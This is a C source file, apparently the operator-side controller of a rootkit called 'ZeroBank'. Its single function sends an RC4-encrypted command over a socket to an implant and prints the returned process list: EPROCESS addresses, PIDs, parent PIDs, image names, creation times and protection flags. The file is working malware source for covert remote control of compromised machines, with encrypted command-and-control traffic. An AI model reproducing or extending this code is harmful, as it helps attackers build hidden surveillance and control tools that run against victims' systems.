#include "server_globals.h"


BOOL rootkit_get_processes(IN SOCKET sock, IN BYTE PacketType)
{
	ZEROBANK_PACKET_TYPE packet = { 0 };
	PZEROBANK_PACKET_TYPE out = NULL;
	PROOTKIT_PROCESS_ENTRY entry = NULL;
	PROOTKIT_PROCESS_ENTRY buffer = NULL;
	INT sendsize = 0;
	INT recvsize = 0;
	ULONG getsize = 0;
	PROOTKIT_PROCESS_LIST_HEAD entrybuffer = NULL;
	PVOID Out = NULL;
	ULONG NumberOfProcess = 0;
	BOOL ret;
	rc4_ctx ctxdec = { 0 };
	INT bytesent = 0;

	char *eprocess = "Eprocess";
	char *pid = "Pid";
	char *ppid = "Ppid";
	char *Image = "Process";
	char *Time = "CreateTime";
	char *Prot = "Protected";


	packet.PacketType = PacketType;
	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&packet, sizeof(ZEROBANK_PACKET_TYPE));
	if (sendsize > 0) 
	{
		// recv bytes for allocation

		recvsize = recv(sock, (char*)&getsize, sizeof(ULONG), 0);
		if (recvsize > 0 && getsize > 0)
		{
			// recv buffer and decrypt it

			Out = recv_decrypted(sock, RC4_KEY_2, (PROOTKIT_PROCESS_ENTRY)buffer, getsize);
			if (Out != NULL)
			{
				// get total number of processes

				NumberOfProcess = getsize / sizeof(ROOTKIT_PROCESS_ENTRY);

				// fill the structure with the memory returned from recv_crypted

				entry = (PROOTKIT_PROCESS_ENTRY)Out;

				printf("\r\n");
				printf("\r\n%s %10s %13s %26s %35s %20s", eprocess, pid, ppid, Image, Time, Prot);
				printf("\r\n");

				for (ULONG i = 0; i < NumberOfProcess; i++, entry++)
				{

					printf("\r\n0x%p %10d %13d %26s %35s %20s",
						entry->Eprocess, \
						entry->pid, \
						entry->ppid, \
						entry->ImageFileName, \
						entry->ProcessCreationTime, \
						entry->IsProcessProtected ? "Yes" : "No");

					ret = TRUE;
				}
				RtlFreeHeap(GetProcessHeap(), 0, Out);
				Out = NULL;
			}
		}
	}
	else
	{
		ret = FALSE;
	}

	return ret;
}